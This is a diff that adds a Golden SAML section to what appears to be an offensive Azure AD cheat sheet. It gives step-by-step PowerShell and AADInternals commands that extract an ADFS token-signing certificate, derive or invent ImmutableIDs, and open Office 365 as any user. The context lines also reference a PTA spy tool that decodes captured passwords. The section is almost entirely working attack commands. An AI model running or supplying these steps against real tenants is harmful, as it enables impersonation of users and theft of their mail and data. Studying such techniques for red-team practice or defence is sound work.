@@ -153,3 +153,49 @@ Get-AADIntPTASpyLog -DecodePasswords
 ```
 Install-AADIntPTASpy
 ```
+
+## Federation (ADFS)
+- Golden SAML Attack
+#### Get the ImmutableID
+```
+[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
+```
+
+#### On ADFS server (As administrator)
+```
+Get-AdfsProperties |select identifier
+```
+
+#### Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
+```
+Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri
+```
+
+#### Extract the ADFS token signing certificate
+- With DA privileges on-prem
+```
+Import-Module .\AADInternals.psd1
+Export-AADIntADFSSigningCertificate
+```
+
+#### Access cloud apps as any user
+```
+Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
+```
+
+### With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!
+#### Create a realistic ImmutableID
+```
+[System.Convert]::ToBase64String((New-Guid).tobytearray())
+```
+
+#### Export the token signing certificate
+```
+Import-Module .\AADInternals.psd1
+Export-AADIntADFSSigningCertificate
+```
+
+#### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
+```
+Open-AADIntOffice365Portal -ImmutableID pwrtlmsicU+5tgCUgHx2tA== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
+```
